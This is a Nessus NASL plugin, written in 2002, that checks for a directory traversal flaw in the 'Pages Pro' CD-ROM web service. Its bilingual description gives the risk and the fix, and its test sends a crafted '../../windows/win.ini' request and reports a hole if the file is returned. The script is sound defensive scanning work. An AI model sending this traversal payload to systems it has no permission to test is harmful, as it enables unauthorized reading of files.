# This script was written by Michel Arboi <arboi@alussinan.org>
#
# GPL
#
# Reference
# http://www.certa.ssi.gouv.fr/site/CERTA-2002-ALE-007/index.html.2.html
#
# Credits:
# Philippe de Brito (Le Mamousse) discovered the flaw and sent his exploit.
#

if(description)
{
 script_id(11221);
 script_version("$Revision: 1.6 $");
 name["english"] = "Pages Pro CD directory traversal";
 name["francais"] = "Traversée de répertoire sur le CD-ROM Pages Pro";
 script_name(english:name["english"], francais:name["francais"]);
 
 desc["english"] = "
A security vulnerability in the 'Pages Pro' allows anybody
to read or modify files that would otherwise be inaccessible using a 
directory traversal attack. 
A cracker may use this to read or write sensitive files or even 
make a phone call.

http://www.certa.ssi.gouv.fr/site/CERTA-2002-ALE-007/index.html.2.html

Solution: Upgrade it (version 2003) or uninstall this product

Risk factor : High";

 desc["francais"] = "
Une vulnérabilité dans le CD-ROM 'Pages Pro' permet à n'importe qui
de lire ou modifier des fichiers normalement inaccessibles en utilisant 
une attaque de type 'directory traversal'.
Un pirate peut exploiter ceci pour lire ou modifier des fichiers 
sensibles ou faire appeler un numéro de téléphone quelconque, par exemple
surtaxé.

http://www.certa.ssi.gouv.fr/site/CERTA-2002-ALE-007/index.html.2.html

Solution : Mettez le à jour (version 2003) ou désinstallez ce produit.

Risque : Élevé";

 script_description(english:desc["english"], francais:desc["francais"]);
 
 summary["english"] = "Pages Pro CD directory traversal";
 summary["francais"] = "Traversée de répertoire sur le CD-ROM Pages Pro";
 script_summary(english:summary["english"], francais:summary["francais"]);
 
 script_category(ACT_ATTACK);
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 8100);
 exit(0);
}

# 

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");


ports = add_port_in_list(list:get_kb_list("Services/www"), port:8100);
foreach port (ports)
{
 file[0] = "windows/win.ini";
 file[1] = "winnt/win.ini";

 for (i = 0; file[i]; i = i + 1)
 { 
  u = string("/note.txt?F_notini=&T_note=&nomentreprise=blah&filenote=../../",
             file[i]);
  if(check_win_dir_trav_ka(port: port, url:u))
  {
    security_hole(port);
    break;
  }
 }
}

